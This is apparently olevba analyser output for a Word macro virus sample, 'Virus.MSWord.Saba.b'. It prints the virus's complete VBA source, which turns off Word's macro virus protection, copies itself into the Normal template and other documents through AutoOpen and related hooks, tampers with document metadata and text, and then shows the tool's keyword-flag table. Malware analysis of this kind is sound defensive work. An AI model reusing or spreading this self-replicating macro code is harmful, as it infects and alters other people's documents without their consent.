olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Saba.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Saba.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sabath.bas 
in file: Virus.MSWord.Saba.b - OLE stream: 'Macros/VBA/sabath'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'ßìùèê, íå ãîíè! Òû ãîíèøü, ÿìùèê!
Sub ViewVBCode()
    On Error Resume Next
    Call sabath
End Sub
Sub sabath()
    
    
On Error Resume Next

Options.ConfirmConversions = False
Options.VirusProtection = False

'Áåäó íàCLICKàë...
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("sabath").Export "c:\sabath.drv"
ActiveDocument.ReadOnlyRecommended = False
'Håò ïîâåñòè ïå÷àëüíåå íà ñâåòå,÷åì ïîâåñòü î çàêëèíèâøåì RESETe...
chislo = Int(Rnd * 100)
'Hàãëîñòü - âòîðîå ñ÷àñòüå.
'À çîìáè çäåñü òèõèå
'À íå ïîéòè ëè ìíå íà ðàáîòó,- ïîäóìàë ÿ. È íå ïîøåë.
'Àëêîãîëü â ìàëûõ äîçàõ áåçâðåäåí â ëþáîì êîëè÷åñòâå!
'Àìåðèêàíöû - ìû èç íåãðîâ çâåçä íå äåëàåì
    If chislo = 99 Then MsgBox "Ïðèâåò VicodinES îò _\` /4 |3 /4 + |-|", vbSystemModal

If Day(Now()) = 1 Or 2 Or 3 Or 4 Or 5 Or 6 Or 13 Or 15 Or 17 Or 18 Or 19 Or 23 Or 25 Or 30 Or 31 Then Call Tooday

With Dialogs(wdDialogFileSummaryInfo)
'Hà õàëÿâó è "ÐÀÌÀ" - ñëèâî÷íîå ìàñëî.
    .Author = " _\` /4 |3 /4 + |-| "
    .Subject = "Viva VicodinES"
    .Comments = "_\` /4 |3 /4 + |-|   REproduction of Vic's XIXpoppy"
    .Execute
'ßìùèê, íå ãîíè! Òû ãîíèøü, ÿìùèê!

End With
If NormalTemplate.VBProject.VBComponents.Item("sabath").Name <> "sabath" Then TemplateNameCheck = True
If ActiveDocument.VBProject.VBComponents.Item("sabath").Name <> "sabath" Then ActiveDocNameCheck = True
If TemplateNameCheck = True And ActiveDocNameCheck = False Then Set VIRIIconst = NormalTemplate.VBProject.VBComponents
If TemplateNameCheck = False And ActiveDocNameCheck = True Then Set VIRIIconst = ActiveDocument.VBProject.VBComponents
VIRIIconst.import "c:\sabath.drv"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If ActiveDocNameCheck = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
'MsgBox "   _\` /4 |3 /4 + |-| tribute to VicodinES "
IDontKnowWhatItWas:
End Sub
Sub HelpAbout()
    On Error Resume Next

    MsgBox " _\` /4 |3 /4 + |-|  ", vbInformation
End Sub
Sub AutoOpen()
    On Error Resume Next
    
ShowVisualBasicEditor = False 'net VB editora
    Call sabath

End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call sabath
End Sub


Sub Tooday()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
'Áåç òðóäà íå çàñóíåøü è òóäà.
'Áåðåãè åãî êàê çåíèöó - âî êàê.
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = " îí "
            .Replacement.Text = "_\` /4 |3 /4 + |-|"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = False
            .MatchAllWordForms = True
        End With
        

        Selection.Find.Execute Replace:=wdReplaceAll
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Sub FileTemplates()
    On Error Resume Next
    With Application

    Call sabath
End Sub
'password for view is xx3
Sub autoclose()
On Error Resume Next
StatusBar = "Get Ur NEW AVir TODAY!!! _\` A |3 A T |-|"


End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

